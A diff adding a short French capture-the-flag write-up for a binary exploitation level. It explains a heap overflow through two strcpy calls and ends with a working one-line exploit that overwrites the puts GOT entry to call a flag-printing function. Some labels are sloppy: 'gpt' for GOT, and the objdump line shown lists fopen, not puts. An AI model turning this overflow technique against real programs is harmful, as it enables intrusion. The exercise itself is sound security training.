@@ -1,0 +1,32 @@
+- Apres analyse du code asm, on remarque 4 malloc de 8 octet, dont certains
+sont sauvegarder a l'intérieur du malloc précédent.
+- L'addresse du 2eme malloc est sauvegardé dans les 4 dernier bit du 1er malloc
+- L'addresse du 4eme malloc est sauvegardé dans les 4 dernier bit du 3eme malloc
+- On remarque ensuite 2 strcpy
+- Le 1er copie argv[1] dans le 2eme malloc
+- Le 2eme copie argv[2] dans le 4eme malloc
+- Un fopen et fgets ouvre et sauvegarde le contenu du fichier avec le flag
+- La function "m" imprime le contenu du buffer contenant le fichier
+- On remarque que buff_1 et buff_2 sont les un a coter des autre en memoire
+
+==> On va exploiter les strcpy afin de réécrire le gpt pour transformer l'appel
+de puts en appel de "m"
+
+-> On obtient l'adresse de "m" avec :
+
+objdump -d ./level7
+
+080484f4 <m>:
+
+-> On obtient l'adresse de puts avec :
+
+objdump -R ./level7
+
+08049934 R_386_JUMP_SLOT   fopen
+
+-> Le 1er argument sera un overflow qui se termine avec l'adresse de puts afin de reecrire sur buff2
+-> Le 2eme argument sera l'adresse de "m" qui grace au strcpy ecrira argv[2] a l endroit de puts
+
+--> Exploit
+
+./level7 `python -c 'print "A" * 20 + "\x28\x99\x04\x08"'` `python -c 'print "\xf4\x84\x04\x08"'`
